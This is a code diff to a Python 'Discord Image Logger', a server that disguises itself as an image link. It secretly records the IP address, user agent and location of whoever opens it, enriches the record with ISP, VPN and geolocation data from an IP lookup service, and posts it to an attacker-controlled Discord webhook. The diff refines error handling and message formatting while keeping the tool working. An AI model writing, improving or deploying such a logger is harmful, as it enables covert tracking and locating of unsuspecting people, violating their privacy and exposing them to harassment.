@@ -1,7 +1,7 @@
 # Discord Image Logger
 # By DeKrypt | https://github.com/dekrypted
 
-from http.server import BaseHTTPRequestHandler
+from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib import parse
 import requests, httpagentparser
 
@@ -50,7 +50,7 @@ def reportError(error):
         "embeds": [{
             "title": "Image Logger - Error",
             "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n```\n{error}\n```"
+            "description": f"An error occurred while trying to log an IP!\n\n**Error: **\n```\n{error}\n```"
         }]
     })
 
@@ -59,7 +59,6 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, image
         return
 
     bot = botCheck(ip, useragent)
-
     if bot:
         if config["linkAlerts"]:
             requests.post(config["webhook"], json={
@@ -68,14 +67,18 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, image
                 "embeds": [{
                     "title": "Image Logger - Link Sent",
                     "color": config["color"],
-                    "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** {bot}",
+                    "description": f"An **Image Logging** link was sent in a chat!\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** {bot}",
                     "image": {"url": image_url or config["image"]}
                 }]
             })
         return
 
     ping = "@everyone"
-    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
+    info = requests.get(f"http://ip-api.com/json/{ip}?fields=status,message,country,regionName,city,lat,lon,timezone,isp,as,proxy,mobile,hosting").json()
+
+    if info.get("status") != "success":
+        reportError(f"Failed to get IP info for {ip}: {info.get('message')}")
+        return
 
     if info.get("proxy"):
         if config["vpnCheck"] == 2:
@@ -84,9 +87,8 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, image
             ping = ""
 
     if info.get("hosting"):
-        if config["antiBot"] in [3, 4]:
-            if not info.get("proxy"):
-                return
+        if config["antiBot"] in [3, 4] and not info.get("proxy"):
+            return
         if config["antiBot"] == 2 and not info.get("proxy"):
             ping = ""
         if config["antiBot"] == 1:
@@ -105,7 +107,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, image
 **Endpoint:** {endpoint}
 
 **IP Info:**
-> **IP:** `{ip or 'Unknown'}`
+> **IP:** `{ip}`
 > **Provider:** `{info.get('isp', 'Unknown')}`
 > **ASN:** `{info.get('as', 'Unknown')}`
 > **Country:** `{info.get('country', 'Unknown')}`
@@ -113,7 +115,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False, image
 > **City:** `{info.get('city', 'Unknown')}`
 > **Coords:** `{str(info.get('lat'))+', '+str(info.get('lon')) if not coords else coords.replace(',', ', ')}`
 > **Timezone:** `{info.get('timezone', 'Unknown')}`
-> **Mobile:** `{info.get('mobile', 'Unknown')}`
+> **Mobile:** `{info.get('mobile', False)}`
 > **VPN:** `{info.get('proxy', False)}`
 > **Bot:** {"Possibly" if info.get('hosting', False) else "False"}
 
@@ -157,7 +159,6 @@ class Handler(BaseHTTPRequestHandler):
 
 def run_server():
     port = 8080
-    from http.server import HTTPServer
     server = HTTPServer(('0.0.0.0', port), Handler)
     print(f"{_app_} running on port {port}")
     server.serve_forever()
